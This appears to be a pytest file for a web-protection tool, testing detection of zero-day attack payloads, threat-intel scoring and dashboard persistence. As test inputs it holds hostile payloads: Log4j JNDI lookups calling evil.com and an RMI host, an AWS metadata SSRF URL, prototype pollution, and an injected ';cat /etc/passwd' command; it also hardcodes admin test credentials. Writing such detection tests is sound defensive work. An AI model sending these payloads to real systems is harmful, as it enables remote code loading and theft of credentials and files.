"""STEALTHWALL — Tests for Body Inspection, 0-Day Threat Engine & Dashboard Persistence."""

from __future__ import annotations

import json
import pytest
from starlette.testclient import TestClient

from block_engine.threat_intel import threat_intel, analyze_zero_day_threat
from dashboard.app import app, state, DashboardState


@pytest.fixture
def client():
    return TestClient(app)


def test_body_inspection_zero_day_threat_analysis():
    # 1. Test JNDI Log4j injection in body
    res_jndi = analyze_zero_day_threat(path="/api/search", payload='{"query": "${jndi:ldap://evil.com/a}"}')
    assert res_jndi["is_zero_day"] is True
    assert "JNDI" in res_jndi["category"]

    # 2. Test AWS Metadata SSRF in body
    res_ssrf = analyze_zero_day_threat(path="/fetch", payload='url=http://169.254.169.254/latest/meta-data/')
    assert res_ssrf["is_zero_day"] is True
    assert "Metadata" in res_ssrf["category"]

    # 3. Test Prototype Pollution in body
    res_proto = analyze_zero_day_threat(path="/api/user", payload='{"__proto__": {"admin": true}}')
    assert res_proto["is_zero_day"] is True
    assert "Prototype" in res_proto["category"]

    # 4. Test Clean Body
    res_clean = analyze_zero_day_threat(path="/api/user", payload='{"name": "Alice", "age": 30}')
    assert res_clean["is_zero_day"] is False


def test_threat_intel_resolve_0day_elevation():
    intel = threat_intel.resolve(
        "198.51.100.42",
        path="/v1/execute",
        payload='{"cmd": ";cat /etc/passwd"}'
    )
    assert intel["is_zero_day"] is True
    assert intel["threat_level"] == "critical"
    assert "Passwd" in intel["zero_day_detail"]


def test_dashboard_sqlite_persistence(client):
    # Authenticate admin session
    res_login = client.post("/api/auth/login", data={"username": "admin", "password": "admin123"}, follow_redirects=False)
    assert res_login.status_code == 302
    client.cookies.set("sid", res_login.cookies["sid"])

    # Fire a decide request with 0-day payload
    payload = {
        "ip": "198.51.100.99",
        "path": "/api/upload",
        "payload": "${jndi:rmi://10.0.0.1/exploit}",
        "score": 0.35
    }
    res_decide = client.post("/internal/decide", json=payload)
    assert res_decide.status_code == 200
    data = res_decide.json()
    assert data["intel"]["is_zero_day"] is True

    # Verify incident persisted in /api/feed
    res_feed = client.get("/api/feed?limit=5")
    assert res_feed.status_code == 200
    feed_events = res_feed.json()
    assert len(feed_events) > 0
    matched = [e for e in feed_events if e.get("ip") == "198.51.100.99"]
    assert len(matched) > 0
    assert matched[0]["is_zero_day"] == 1 or matched[0]["is_zero_day"] is True

    # Test state reload survives new DashboardState instance
    new_state = DashboardState(dry_run=True)
    assert new_state.total_requests >= 1
    assert new_state.action_counts[data["action"]] >= 1
